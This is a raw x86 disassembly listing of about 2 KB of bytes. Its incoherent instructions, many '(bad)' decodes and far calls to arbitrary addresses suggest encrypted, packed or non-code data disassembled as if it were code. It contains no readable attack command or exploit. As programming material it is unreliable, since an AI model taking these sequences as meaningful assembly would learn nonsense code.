  4126d7:	(bad)  
  4126d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126d9:	out    0x53,eax
  4126db:	adc    dl,BYTE PTR [esi-0x499ce7fe]
  4126e1:	mov    bl,dl
  4126e3:	cs push es
  4126e5:	icebp  
  4126e6:	cdq    
  4126e7:	push   esi
  4126e8:	adc    BYTE PTR [esi+0x1eda57f4],ch
  4126ee:	out    dx,eax
  4126ef:	scas   eax,DWORD PTR es:[edi]
  4126f0:	mov    ds:0xc1a6cb1b,eax
  4126f5:	shl    ah,0xc0
  4126f8:	enter  0xc307,0xe1
  4126fc:	cdq    
  4126fd:	fs and al,0x82
  412700:	mov    ebx,0x615503c4
  412705:	test   eax,0x8d8e5cd0
  41270a:	inc    edi
  41270b:	pop    edi
  41270c:	mov    ebx,0xd815db03
  412711:	jp     0x4126d6
  412713:	mov    WORD PTR [ebp-0x1],?
  412716:	mov    WORD PTR [ebp-0x7358ea04],?
  41271c:	sub    ecx,DWORD PTR [edx-0x22]
  41271f:	or     cl,bl
  412721:	mov    eax,0xae46927f
  412726:	nop
  412727:	inc    edx
  412728:	mov    al,ds:0xab6c364b
  41272d:	xchg   BYTE PTR [edx+edi*1+0x3b],bl
  412731:	dec    ebx
  412732:	pop    eax
  412733:	mov    bl,0x49
  412735:	stc    
  412736:	mov    edi,0x877684a1
  41273b:	inc    ebp
  41273c:	xor    edx,DWORD PTR [edi]
  41273e:	rol    DWORD PTR [ebx+eiz*4-0x4b],0x23
  412743:	xor    DWORD PTR ds:0x8a0078d2,0x7d
  41274a:	push   esi
  41274b:	push   ds
  41274c:	mov    al,0xb1
  41274e:	rcl    BYTE PTR [esi],cl
  412750:	call   0xe5e70f08
  412755:	lods   al,BYTE PTR ds:[esi]
  412756:	mov    gs,WORD PTR [esi+0x1b]
  412759:	xchg   esp,eax
  41275a:	and    DWORD PTR [ebp+0x29],ecx
  41275d:	aam    0x18
  41275f:	xor    ecx,DWORD PTR [ecx-0x32]
  412762:	cmc    
  412763:	cdq    
  412764:	push   edi
  412765:	dec    ebp
  412766:	pop    eax
  412767:	ss sub al,0xce
  41276a:	iret   
  41276b:	push   cs
  41276c:	inc    esi
  41276d:	xor    edi,DWORD PTR ds:0x8b79c803
  412773:	mov    edx,0x82b9a834
  412778:	test   al,0xf1
  41277a:	pop    es
  41277b:	imul   edx,DWORD PTR [eax],0xd2202cd3
  412781:	push   0x53
  412783:	mov    bl,0xe5
  412785:	jbe    0x412745
  412787:	aas    
  412788:	mov    ah,0x5
  41278a:	xchg   edi,eax
  41278b:	jno    0x4127ee
  41278d:	jae    0x412749
  41278f:	shl    ah,0x6d
  412792:	out    dx,eax
  412793:	test   bl,dh
  412795:	popf   
  412796:	mov    ebx,0x766c27c1
  41279b:	ss in  eax,dx
  41279d:	pop    eax
  41279e:	adc    DWORD PTR [esi+0x13],edi
  4127a1:	sbb    eax,0x3c75398d
  4127a6:	in     al,0xd1
  4127a8:	cdq    
  4127a9:	dec    ecx
  4127aa:	(bad)  
  4127ab:	loopne 0x4127ff
  4127ad:	js     0x412820
  4127af:	sub    al,0x18
  4127b1:	je     0x412756
  4127b3:	out    0xe5,al
  4127b5:	scas   eax,DWORD PTR es:[edi]
  4127b6:	sbb    BYTE PTR [ebp-0x70f4d8c3],ah
  4127bc:	and    ebp,DWORD PTR [esi-0x5dd746bc]
  4127c2:	pop    ss
  4127c3:	lods   eax,DWORD PTR ds:[esi]
  4127c4:	push   ebx
  4127c5:	popa   
  4127c6:	cmp    esi,esi
  4127c8:	push   cs
  4127c9:	push   cs
  4127ca:	and    BYTE PTR [edi-0x65],dl
  4127cd:	mov    ds:0xa72337d5,al
  4127d2:	call   0xfde7:0x2b534153
  4127d9:	fisubr DWORD PTR [edi+ecx*4+0x5f]
  4127dd:	jg     0x412815
  4127df:	adc    eax,0x3d275e15
  4127e4:	dec    esp
  4127e5:	jae    0x41284c
  4127e7:	in     eax,0xc2
  4127e9:	(bad)  
  4127ea:	fstp   DWORD PTR [ebp+0x25]
  4127ed:	xor    BYTE PTR [esi+edx*1+0x78],bl
  4127f1:	(bad)  
  4127f2:	pop    ds
  4127f3:	cmp    DWORD PTR [ebx+esi*8],ecx
  4127f6:	mov    cl,BYTE PTR [edi-0x280b2f1d]
  4127fc:	scas   al,BYTE PTR es:[edi]
  4127fd:	test   DWORD PTR [esi+0x6a],ecx
  412800:	int    0xba
  412802:	or     BYTE PTR ds:0xed9b3db5,ah
  412808:	jae    0x41278b
  41280a:	icebp  
  41280b:	pop    edx
  41280c:	mov    ecx,0x3ffae652
  412811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412812:	js     0x412834
  412814:	adc    eax,0x82ba929f
  412819:	fwait
  41281a:	lods   eax,DWORD PTR ds:[esi]
  41281b:	jg     0x412826
  41281d:	outs   dx,BYTE PTR ds:[esi]
  41281e:	xor    edi,eax
  412820:	jecxz  0x412892
  412822:	out    0x6f,eax
  412824:	mov    ebp,DWORD PTR [esi]
  412826:	add    al,0x5f
  412828:	add    ebp,ecx
  41282a:	fisttp DWORD PTR [ebx-0x630b3269]
  412830:	sti    
  412831:	repz lea ebp,[eax+0x37]
  412835:	xchg   esp,eax
  412836:	xchg   ebp,eax
  412837:	sbb    BYTE PTR [ebp+0x2987f225],0xe7
  41283e:	jge    0x412868
  412840:	mov    DWORD PTR [edi-0x71c05344],esp
  412846:	add    ah,BYTE PTR [edi]
  412848:	fadd   st,st(2)
  41284a:	pusha  
  41284b:	mov    cl,0x83
  41284d:	popaw  
  41284f:	outs   dx,BYTE PTR ds:[esi]
  412850:	mov    ebp,0xa7264d72
  412855:	xor    eax,0x3f61b1b
  41285a:	inc    esp
  41285b:	lds    ecx,FWORD PTR [eax-0x26e14bfd]
  412861:	shl    DWORD PTR [ebx+esi*8+0x2c],1
  412865:	or     DWORD PTR [edx],esp
  412867:	(bad)  
  412868:	loope  0x4128a7
  41286a:	sub    dh,bl
  41286c:	xor    ebx,DWORD PTR [ecx+0x3c2b6d76]
  412872:	popf   
  412873:	mov    dh,0xf1
  412875:	jno    0x4128b4
  412877:	sbb    al,bh
  412879:	leave  
  41287a:	pop    esi
  41287b:	imul   edi,DWORD PTR [ecx],0xffffffb4
  41287e:	fsub   QWORD PTR ds:0x7364a02f
  412884:	aaa    
  412885:	pusha  
  412886:	sbb    eax,0x7b29114d
  41288b:	sti    
  41288c:	iret   
  41288d:	mov    DWORD PTR [edx+eax*1],0x51506f59
  412894:	sbb    BYTE PTR [ebp+0x46],bl
  412897:	ins    DWORD PTR es:[edi],dx
  412898:	out    0x72,al
  41289a:	sub    ch,BYTE PTR [ecx]
  41289c:	and    ebp,DWORD PTR [eax-0x58]
  41289f:	out    0xf9,al
  4128a1:	push   es
  4128a2:	ins    BYTE PTR es:[edi],dx
  4128a3:	add    al,dl
  4128a5:	mov    bl,0x83
  4128a7:	pop    ebx
  4128a8:	das    
  4128a9:	fidiv  DWORD PTR [eax+0x2a]
  4128ac:	fisttp QWORD PTR [ebx-0x21b0179c]
  4128b2:	mov    ebp,0x150b77b2
  4128b7:	pop    esp
  4128b8:	mov    ebp,0x912a316b
  4128bd:	push   esp
  4128be:	jmp    0x8d35d3
  4128c3:	retf   0xd7c8
  4128c6:	sub    edi,ebp
  4128c8:	shl    ebp,1
  4128ca:	sbb    dh,BYTE PTR gs:[eax+0x76]
  4128ce:	push   0x52bdfff8
  4128d3:	jecxz  0x4128db
  4128d5:	jb     0x4128bb
  4128d7:	cdq    
  4128d8:	adc    DWORD PTR [ecx],edi
  4128da:	aas    
  4128db:	fsubr  DWORD PTR ds:0x9ce8410c
  4128e1:	push   ds
  4128e2:	dec    edi
  4128e3:	mov    bh,0x90
  4128e5:	sub    eax,0xd7c972be
  4128ea:	mov    esp,DWORD PTR [esi+0xc448a79]
  4128f0:	lea    ebx,[esi+0x4a]
  4128f3:	mov    ds:0x6de52570,al
  4128f8:	dec    esi
  4128f9:	fistp  QWORD PTR [ecx+eax*4]
  4128fc:	out    0x53,eax
  4128fe:	repnz push eax
  412900:	xor    eax,0xd745ea0c
  412905:	fwait
  412906:	pop    esi
  412907:	push   cs
  412908:	iret   
  412909:	test   BYTE PTR ds:0x35cefc0e,0x18
  412910:	inc    esi
  412911:	mov    ds:0x5b24da6c,al
  412916:	ret    0xaa2c
  412919:	in     eax,dx
  41291a:	inc    ecx
  41291b:	jl     0x412997
  41291d:	dec    esi
  41291e:	sbb    eax,0xf9530442
  412923:	mov    esp,0xec8e4a4c
  412928:	(bad)  
  412929:	iret   
  41292a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41292c:	fcmovnu st,st(3)
  41292e:	data16 sahf 
  412930:	push   edx
  412931:	inc    eax
  412932:	(bad)  
  412934:	sub    eax,0xd85b3d54
  412939:	fs daa 
  41293b:	data16 mov dl,0x69
  41293e:	jecxz  0x4128fb
  412940:	or     eax,0x1c57e98c
  412945:	sub    cl,0xaf
  412948:	mov    ds:0xd578e398,al
  41294d:	adc    ah,bh
  41294f:	xchg   edx,eax
  412950:	adc    DWORD PTR [esi-0x724fd386],edi
  412956:	sbb    ecx,ebp
  412958:	iret   
  412959:	hlt    
  41295a:	inc    BYTE PTR [esi+0x5faa6c97]
  412960:	ss cmp eax,0x1ed94252
  412966:	ror    DWORD PTR [ebp+0x7d],cl
  412969:	jmp    0x5d4987e3
  41296e:	dec    ebx
  41296f:	and    eax,0xf852fe24
  412974:	pushf  
  412975:	mov    ch,0x17
  412977:	mov    edi,0x88394c21
  41297c:	xchg   edi,eax
  41297d:	add    eax,0x3eeb4944
  412982:	xchg   ebp,eax
  412983:	and    bh,ch
  412985:	push   esi
  412986:	add    dl,al
  412988:	pop    edi
  412989:	mov    ebx,0x323457a8
  41298e:	sub    BYTE PTR [eax+ebx*2-0x1f16704f],al
  412995:	in     eax,0x18
  412997:	call   0xc29a3052
  41299c:	jno    0x412a17
  41299e:	(bad)  
  41299f:	sbb    eax,0x94ece556
  4129a4:	push   ebp
  4129a5:	fdivp  st(6),st
  4129a7:	mov    eax,ds:0x394e5681
  4129ac:	stos   DWORD PTR es:[edi],eax
  4129ad:	sbb    dh,0x23
  4129b0:	mov    eax,0x8a15fbd0
  4129b5:	mov    cl,0x72
  4129b7:	and    BYTE PTR [eax-0x6135e8b4],dh
  4129bd:	pop    esp
  4129be:	rcl    BYTE PTR [edx+0x10244ace],0xa2
  4129c5:	daa    
  4129c6:	push   cs
  4129c7:	imul   ebx,esi,0xb749431b
  4129cd:	das    
  4129ce:	jnp    0x41297a
  4129d0:	inc    esi
  4129d1:	stos   BYTE PTR es:[edi],al
  4129d2:	into   
  4129d3:	outs   dx,DWORD PTR ds:[esi]
  4129d4:	gs push ss
  4129d6:	xchg   ebx,eax
  4129d7:	jp     0x412a0f
  4129d9:	fnstenv [ebp-0xcc6f385]
  4129df:	mov    esp,0x3ddffec9
  4129e4:	ins    DWORD PTR es:[edi],dx
  4129e5:	and    ebp,esi
  4129e7:	pop    esi
  4129e8:	pop    edx
  4129e9:	(bad)  
  4129ea:	mov    esp,0x317cbad8
  4129ef:	(bad)  
  4129f0:	rcr    DWORD PTR [esi+ebx*4+0x81c79d9],cl
  4129f7:	ror    BYTE PTR [ecx+eax*8-0x6],0x8e
  4129fc:	ret    
  4129fd:	push   DWORD PTR [edx+ebp*2+0x3d1081f8]
  412a04:	leave  
  412a05:	das    
  412a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a07:	into   
  412a08:	outs   dx,BYTE PTR ds:[esi]
  412a09:	mov    edi,0x82269f03
  412a0e:	ins    BYTE PTR es:[edi],dx
  412a0f:	xchg   al,al
  412a11:	ins    BYTE PTR es:[edi],dx
  412a12:	pop    es
  412a13:	imul   esi,DWORD PTR [ebp+0x4b819e0a],0xfffffff0
  412a1a:	push   esi
  412a1b:	repnz mov edi,0x34b0d0e3
  412a21:	btr    DWORD PTR [edi],edi
  412a24:	sbb    ch,dl
  412a26:	std    
  412a27:	or     ecx,DWORD PTR [eax+0x662ddd41]
  412a2d:	gs xchg edi,eax
  412a2f:	ins    BYTE PTR es:[di],dx
  412a31:	in     al,dx
  412a32:	add    eax,0xcdaf6728
  412a37:	dec    edx
  412a38:	dec    eax
  412a39:	mov    edx,0x475a8a63
  412a3e:	lds    ecx,FWORD PTR [edi-0x7c]
  412a41:	cmp    eax,DWORD PTR [esi]
  412a43:	test   BYTE PTR [edi+0x1f8b1305],al
  412a49:	and    al,0x7f
  412a4b:	icebp  
  412a4c:	mov    edi,0x840a0745
  412a51:	lea    esi,[esi-0x596ca2c9]
  412a57:	mov    ah,0x56
  412a59:	inc    esi
  412a5a:	mov    ebx,0xb6eba239
  412a5f:	out    0xca,eax
  412a61:	inc    ecx
  412a62:	pop    ecx
  412a63:	sbb    al,0xec
  412a65:	ds aaa 
  412a67:	add    BYTE PTR [esi+0x5b],0x16
  412a6b:	lea    esp,[ebp-0x52]
  412a6e:	mov    ds:0xd382f54b,eax
  412a73:	(bad)  
  412a74:	scas   al,BYTE PTR es:[edi]
  412a75:	lods   al,BYTE PTR ds:[esi]
  412a76:	cld    
  412a77:	pop    ebp
  412a78:	add    al,0xaf
  412a7a:	int3   
  412a7b:	lds    esp,FWORD PTR [esi]
  412a7d:	jno    0x412a25
  412a7f:	lds    eax,FWORD PTR ds:0xd4cf5b92
  412a85:	sbb    al,0x47
  412a87:	pmuludq mm5,QWORD PTR ss:[eax-0xb23c27e]
  412a8f:	push   ebx
  412a90:	into   
  412a91:	mov    bl,0xb6
  412a93:	out    dx,eax
  412a94:	mov    bl,0x16
  412a96:	jge    0x412a9d
  412a98:	mov    al,ds:0xe7c43fd5
  412a9d:	or     esi,DWORD PTR [edi+eax*4-0x142d6cec]
  412aa4:	daa    
  412aa5:	push   ecx
  412aa6:	test   eax,0x39cbc3c2
  412aab:	retf   0xe49d
  412aae:	pop    edx
  412aaf:	repz (bad) 
  412ab1:	call   0x1667:0xfcceebf1
  412ab8:	lds    edx,FWORD PTR [edi-0x64f04c1e]
  412abe:	(bad)
  412ac1:	xchg   ecx,eax
  412ac2:	xlat   BYTE PTR ds:[ebx]
  412ac3:	xchg   edx,eax
  412ac4:	or     al,0xbd
  412ac6:	jle    0x412af9
  412ac8:	rcr    BYTE PTR [ebp+0x39],cl
  412acb:	fcom   DWORD PTR [edi-0x5d143c8c]
  412ad1:	shr    BYTE PTR [edx],cl
  412ad3:	fisub  WORD PTR [ebp+edx*2+0x1a793e38]
  412ada:	mov    edx,0x352260b0
  412adf:	push   ss
  412ae0:	sahf   
  412ae1:	dec    eax
  412ae2:	jno    0x412a6c
  412ae4:	adc    DWORD PTR ds:0xed5afaa5,eax
  412aea:	cmp    al,0x26
  412aec:	ins    DWORD PTR es:[edi],dx
  412aed:	je     0x412b65
  412aef:	cmp    al,0x5e
  412af1:	loopne 0x412ae6
  412af3:	(bad)  
  412af4:	retf   0x6ca6
  412af7:	mov    dl,BYTE PTR [ecx+0x4d]
  412afa:	cmp    esi,esi
  412afc:	inc    edi
  412afd:	and    dl,ah
  412aff:	les    eax,FWORD PTR [edx+0x23]
  412b02:	loop   0x412ada
  412b04:	ds dec eax
  412b06:	inc    esi
  412b07:	sbb    dl,dl
  412b09:	sub    al,0x76
  412b0b:	mov    bl,0xb5
  412b0d:	(bad)  
  412b0e:	jp     0x412b53
  412b10:	jno    0x412a95
  412b12:	test   eax,0xdea7f09f
  412b17:	out    dx,al
  412b18:	scas   al,BYTE PTR es:[edi]
  412b19:	xor    ebp,DWORD PTR fs:[edx-0x51]
  412b1d:	xchg   ebp,eax
  412b1e:	sub    al,0xd8
  412b20:	xchg   ebp,eax
  412b21:	call   0xbce4:0x9480b504
  412b28:	stos   DWORD PTR es:[edi],eax
  412b29:	dec    eax
  412b2a:	outs   dx,BYTE PTR ds:[esi]
  412b2b:	sbb    al,0x92
  412b2d:	xchg   ecx,edx
  412b2f:	adc    DWORD PTR [edi],0xffffffa8
  412b32:	sahf   
  412b33:	push   esi
  412b34:	xchg   edx,eax
  412b35:	stos   BYTE PTR es:[edi],al
  412b36:	hlt    
  412b37:	hlt    
  412b38:	cmp    al,BYTE PTR gs:[ecx]
  412b3b:	call   0x36796936
  412b40:	fwait
  412b41:	ror    BYTE PTR [esi],1
  412b43:	xchg   edx,eax
  412b44:	in     al,0xc7
  412b46:	push   eax
  412b47:	fdiv   QWORD PTR [ebx-0x7b]
  412b4a:	sbb    DWORD PTR [ebp-0x7a],esi
  412b4d:	cmp    bh,bl
  412b4f:	jg     0x412ae1
  412b51:	aaa    
  412b52:	sub    al,0xcb
  412b54:	jp     0x412bca
  412b56:	cmp    BYTE PTR [edi+0x4e],bh
  412b59:	push   0xb7cca847
  412b5e:	es push 0xfffffff3
  412b61:	ja     0x412b94
  412b63:	int3   
  412b64:	and    al,0x3
  412b66:	sub    ebx,DWORD PTR [ecx+edx*2+0x30]
  412b6a:	mov    ebx,DWORD PTR [ebp-0x7f]
  412b6d:	cwde   
  412b6e:	les    eax,FWORD PTR [esi]
  412b70:	ins    BYTE PTR es:[edi],dx
  412b71:	mov    WORD PTR [ecx+0x7e],?
  412b74:	rcl    BYTE PTR [eax-0x44e055e3],0x4f
  412b7b:	mov    cl,dh
  412b7d:	pusha  
  412b7e:	(bad)  
  412b7f:	cli    
  412b80:	cmp    al,0xc3
  412b82:	cwde   
  412b83:	sbb    al,0x66
  412b85:	dec    edx
  412b86:	pushf  
  412b87:	jle    0x412b79
  412b89:	aaa    
  412b8a:	mov    eax,ds:0x85eac076
  412b8f:	lahf   
  412b90:	jnp    0x412be8
  412b92:	test   ah,dl
  412b94:	sub    dl,BYTE PTR [eax+0x3f8962b1]
  412b9a:	stos   BYTE PTR es:[edi],al
  412b9b:	aas    
  412b9c:	dec    edi
  412b9d:	xor    ebx,ebp
  412b9f:	xor    eax,0x3365b611
  412ba4:	hlt    
  412ba5:	fwait
  412ba6:	out    0x10,eax
  412ba8:	jmp    eax
  412baa:	xor    eax,0x6dfd5400
  412baf:	arpl   WORD PTR [edi-0x38],cx
  412bb2:	xor    DWORD PTR [edx-0x6677fd19],edx
  412bb8:	mov    dh,dh
  412bba:	sub    eax,0x9adffd92
  412bbf:	popf   
  412bc0:	test   BYTE PTR [esi-0x62],bh
  412bc3:	bound  ecx,QWORD PTR [ebx]
  412bc5:	add    eax,0x4b2276b2
  412bca:	in     al,dx
  412bcb:	in     eax,dx
  412bcc:	jmp    0x2f46f2bf
  412bd1:	or     BYTE PTR [ebx],0x26
  412bd4:	jmp    0x412c16
  412bd6:	mov    esi,0xca4db8f
  412bdb:	xchg   DWORD PTR [ebp+0x15706876],edi
  412be1:	sbb    eax,0x41e4fd32
  412be6:	xchg   BYTE PTR [esi],dl
  412be8:	bound  ebp,QWORD PTR [ebx-0x5]
  412beb:	mov    ebp,0x2fb59050
  412bf0:	rcr    DWORD PTR [eax],1
  412bf2:	ins    DWORD PTR es:[edi],dx
  412bf3:	mov    bh,0x47
  412bf5:	sbb    al,BYTE PTR [ebx+0x2cfd179c]
  412bfb:	mov    cl,0x68
  412bfd:	dec    esi
  412bfe:	jg     0x412b84
  412c00:	scas   al,BYTE PTR es:[edi]
  412c01:	xor    BYTE PTR [eax-0x2110c7d],dh
  412c07:	sub    al,BYTE PTR [edx+ebx*8+0x10ba6047]
  412c0e:	retf   
  412c0f:	frstor [esi]
  412c11:	jae    0x412c79
  412c13:	push   esi
  412c14:	xchg   esp,eax
  412c15:	in     al,dx
  412c16:	rol    BYTE PTR [ecx-0x56],1
  412c19:	(bad)  [eax+0xfdba667]
  412c1f:	aam    0x62
  412c21:	aad    0x67
  412c23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c24:	test   eax,0xf81a1e43
  412c29:	bound  esp,QWORD PTR [edi]
  412c2b:	gs enter 0xea97,0xc9
  412c30:	or     DWORD PTR [ebp-0x45],ebx
  412c33:	stc    
  412c34:	in     eax,0x2b
  412c36:	arpl   WORD PTR [ecx+edx*4+0x66b25c6c],dx
  412c3d:	mov    dl,0xe4
  412c3f:	fimul  WORD PTR fs:[ecx+0x54e8839d]
  412c46:	inc    esi
  412c47:	and    al,0xf0
  412c49:	mov    BYTE PTR [edx],dl
  412c4b:	cdq    
  412c4c:	sbb    bh,BYTE PTR [esi+0x14]
  412c4f:	mov    DWORD PTR [edx+ebx*1],esi
  412c52:	add    dl,ah
  412c54:	jo     0x412cd1
  412c56:	mov    BYTE PTR [ebx],ch
  412c58:	jno    0x412c25
  412c5a:	out    dx,al
  412c5b:	scas   eax,DWORD PTR es:[edi]
  412c5c:	fld    TBYTE PTR [ecx]
  412c5e:	fstp   QWORD PTR [edi+0x11]
  412c61:	mov    ah,0xfd
  412c63:	xchg   esi,eax
  412c64:	cmp    dl,BYTE PTR [esp+ebp*2]
  412c67:	ret    
  412c68:	data16 in al,0xe1
  412c6b:	jbe    0x412bf6
  412c6d:	xchg   ebx,eax
  412c6e:	outs   dx,DWORD PTR ds:[esi]
  412c6f:	aas    
  412c70:	aaa    
  412c71:	arpl   WORD PTR [esi],sp
  412c73:	in     eax,dx
  412c74:	outs   dx,BYTE PTR ds:[esi]
  412c75:	dec    ebx
  412c76:	out    0xb8,eax
  412c78:	rcr    cl,0xd2
  412c7b:	mov    ds:0x53a60ff0,eax
  412c80:	loopne 0x412c83
  412c82:	jae    0x412c3d
  412c84:	sbb    bh,BYTE PTR [esi]
  412c86:	adc    al,0x28
  412c88:	mov    WORD PTR [eax-0x4592f873],gs
  412c8e:	test   al,ch
  412c90:	jge    0x412c2d
  412c92:	mov    esi,0xfa58cd56
  412c97:	lods   al,BYTE PTR ds:[esi]
  412c98:	ret    
  412c99:	mov    bh,0x78
  412c9b:	lock lock xor eax,0x93e9ba14
  412ca2:	jns    0x412cfa
  412ca4:	int3   
  412ca5:	ds mov ch,0xea
  412ca8:	jecxz  0x412c68
  412caa:	sbb    eax,0x92a35b2b
  412caf:	loop   0x412cbe
  412cb1:	lds    esi,FWORD PTR [eax]
  412cb3:	test   eax,0xcd619f82
  412cb8:	xchg   edi,eax
  412cb9:	js     0x412cea
  412cbb:	jo     0x412d0f
  412cbd:	cmp    BYTE PTR [edi+0x6bd7050e],bh
  412cc3:	shr    DWORD PTR [eax-0x36151b66],0x44
  412cca:	or     DWORD PTR [edx+0x524d2781],eax
  412cd0:	stos   DWORD PTR es:[edi],eax
  412cd1:	call   0x106c:0x9560624d
  412cd8:	xor    eax,0x1b2f5813
  412cdd:	jae    0x412d28
  412cdf:	leave  
  412ce0:	in     eax,dx
  412ce1:	imul   ebp,DWORD PTR [ebx+0x18],0xe17fe0ee
  412ce8:	js     0x412cde
  412cea:	repz dec esi
  412cec:	out    0x8c,al
  412cee:	lods   al,BYTE PTR ds:[esi]
  412cef:	add    BYTE PTR [ebx-0x1bfe71f6],bh
  412cf5:	fcomi  st,st(1)
  412cf7:	fs push cs
  412cf9:	fiadd  WORD PTR [edx]
  412cfb:	jb     0x412d7a
  412cfd:	add    DWORD PTR [edx+0x761e2c13],ebx
  412d03:	push   ss
  412d04:	popa   
  412d05:	int    0x5c
  412d07:	pop    esp
  412d08:	mov    cl,0x46
  412d0a:	mov    WORD PTR [ebp+0x5b],es
  412d0d:	xchg   DWORD PTR [edx-0x146e5412],edx
  412d13:	inc    eax
  412d14:	std    
  412d15:	sub    edx,ecx
  412d17:	adc    cl,BYTE PTR [ebp-0x65c519c]
  412d1d:	cmp    BYTE PTR [ebp-0x1d],bl
  412d20:	imul   ecx,DWORD PTR [eax],0xb223b01b
  412d26:	sub    DWORD PTR [edx],ebx
  412d28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d29:	add    ch,ch
  412d2b:	das    
  412d2c:	loopne 0x412cef
  412d2e:	shl    BYTE PTR [ebp-0x22],cl
  412d31:	out    0xef,al
  412d33:	fadd   DWORD PTR [ecx+esi*4+0x76136634]
  412d3a:	retf   0x50c5
  412d3d:	in     al,0x28
  412d3f:	leave  
  412d40:	or     ebx,DWORD PTR [ecx+esi*8]
  412d43:	or     ch,BYTE PTR ds:0xa862e250
  412d49:	or     cl,bl
  412d4b:	cmp    eax,0x94fd7179
  412d50:	mov    BYTE PTR [esi-0x35],al
  412d53:	sbb    DWORD PTR [ebx+ebp*8-0x34],ebx
  412d57:	sub    BYTE PTR ds:0x2c370b2a,dh
  412d5d:	cmp    ebx,ebx
  412d5f:	call   0x6d48:0xc25d4f60
  412d66:	add    eax,0xafe55096
  412d6b:	rcl    DWORD PTR [ecx+0x1d],1
  412d6e:	add    BYTE PTR [ebx],ah
  412d70:	int    0x88
  412d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d73:	or     eax,DWORD PTR [ecx+0x3d239b07]
  412d79:	dec    ebx
  412d7a:	cmp    BYTE PTR [esi+0x37],0x44
  412d7e:	mov    esp,0x74a2e54a
  412d83:	xor    bh,al
  412d85:	mov    ss,WORD PTR [ecx+0x7fdc5309]
  412d8b:	rol    BYTE PTR [ecx+0x79e5e956],1
  412d91:	pop    ss
  412d92:	enter  0x9f9,0x15
  412d96:	into   
  412d97:	or     bh,0x19
  412d9a:	mov    eax,ds:0xca8fa48c
  412d9f:	jmp    0x6917fece
  412da4:	int    0x4f
  412da6:	(bad)  
  412da7:	sar    BYTE PTR [esi+0x52],1
  412daa:	push   es
  412dab:	enter  0x686c,0xe9
  412daf:	jecxz  0x412e04
  412db1:	or     eax,0x928821ae
  412db6:	mov    ds:0x304cd9cf,eax
  412dbb:	push   ebx
  412dbc:	fsubr  DWORD PTR [edi-0x355a8c01]
  412dc2:	push   ebx
  412dc3:	bound  esp,QWORD PTR [edi-0x65c87008]
  412dc9:	adc    edx,edi
  412dcb:	jecxz  0x412e14
  412dcd:	lods   eax,DWORD PTR ds:[esi]
  412dce:	xchg   esp,eax
  412dcf:	xor    DWORD PTR [ebp-0x795672ee],ebp
  412dd5:	loop   0x412db9
  412dd7:	bound  ebp,QWORD PTR [edx]
  412dd9:	and    al,0x3e
  412ddb:	xchg   ebp,eax
  412ddc:	js     0x412e4a
  412dde:	sub    BYTE PTR [ebx],al
  412de0:	aas    
  412de1:	repnz scas eax,DWORD PTR es:[edi]
  412de3:	xchg   cl,cl
  412de5:	push   edx
  412de6:	xchg   BYTE PTR [esi-0x7a],cl
  412de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dea:	dec    esp
  412deb:	repz mov esi,0xb0fdee52
  412df1:	sbb    ebx,DWORD PTR [ebx+0xf]
  412df4:	jno    0x412e13
  412df6:	cs add ch,bh
  412df9:	shr    BYTE PTR [ebx-0x48],0xc5
  412dfd:	sti    
  412dfe:	shl    esi,cl
  412e00:	and    al,0x27
  412e02:	xor    eax,0x34f8f930
  412e07:	mov    al,BYTE PTR [ecx-0x17]
  412e0a:	jbe    0x412e5d
  412e0c:	push   ecx
  412e0d:	or     DWORD PTR [eax+0x9c848d7],ecx
  412e13:	sub    al,0xaf
  412e15:	fmulp  st(2),st
  412e17:	les    esi,FWORD PTR [ebx-0x6460e700]
  412e1d:	out    0x92,al
  412e1f:	xchg   DWORD PTR [edx+0x64],ebp
  412e22:	pop    es
  412e23:	or     eax,0xc0ef6ae8
  412e28:	outs   dx,DWORD PTR ds:[esi]
  412e29:	popf   
  412e2a:	sbb    al,0x1e
  412e2c:	in     eax,0xa5
  412e2e:	fistp  DWORD PTR [esi-0x1b]
  412e31:	shr    ebp,1
  412e33:	pusha  
  412e34:	pop    edx
  412e35:	bound  ecx,QWORD PTR [ebp-0x5b7cc657]
  412e3b:	sub    BYTE PTR [eax+esi*4-0xc8993bc],ch
  412e42:	ss jge 0x412ea9
  412e45:	cmp    al,0x4e
  412e47:	push   cs
  412e48:	dec    eax
  412e49:	cmp    ebp,edi
  412e4b:	mov    cl,0xa9
  412e4d:	lock inc ebx
  412e4f:	imul   DWORD PTR [ecx+eiz*8+0x4852ac24]
  412e56:	sbb    bl,0xc2
  412e59:	mov    ah,0xf4
  412e5b:	push   esi
  412e5c:	adc    al,dh
  412e5e:	out    0x43,al
  412e60:	out    dx,eax
  412e61:	test   DWORD PTR ds:0xe20fefc9,eax
  412e67:	mov    esp,DWORD PTR [edx+0x491b70be]
  412e6d:	bound  ecx,QWORD PTR [ebx+0x35]
  412e70:	sbb    eax,DWORD PTR [eax+0x7c]
  412e73:	adc    DWORD PTR [edi+0x40e8417e],edi
  412e79:	xor    BYTE PTR [eax-0x68fbf924],bl
  412e7f:	mov    bh,0xf6
  412e81:	sub    eax,0x551201e0
  412e86:	repnz (bad) 
  412e89:	and    al,BYTE PTR [edx-0x2b832b2b]
  412e8f:	scas   al,BYTE PTR es:[edi]
  412e90:	lds    edx,FWORD PTR [ebx]
  412e92:	mov    ebx,0x6daf4ea5
  412e97:	mov    bh,BYTE PTR [eax+0x13885704]
  412e9d:	std    
  412e9e:	mov    ebx,0xc13725fd
  412ea3:	loopne 0x412ea7
  412ea5:	pop    eax
  412ea6:	cs jmp 0x8a8b:0x7bb3f018
  412eae:	jne    0x412ee5
  412eb0:	push   es
  412eb1:	inc    edx
  412eb2:	fstp   TBYTE PTR ds:0xf96c794c
  412eb8:	or     eax,0x4825120b
  412ebd:	fdivr  DWORD PTR [ebx]
  412ebf:	sbb    al,0xa4
  412ec1:	xchg   ecx,eax
  412ec2:	jle    0x412e95
  412ec4:	mov    bl,0xa3
  412ec6:	inc    edx
  412ec7:	push   esp
  412ec8:	xchg   ebx,eax
  412ec9:	or     esi,DWORD PTR [ecx]
  412ecb:	or     DWORD PTR [edi],ebx
  412ecd:	lds    ecx,FWORD PTR [eax-0x1c029a4f]
  412ed3:	push   eax
  412ed4:	arpl   bp,si
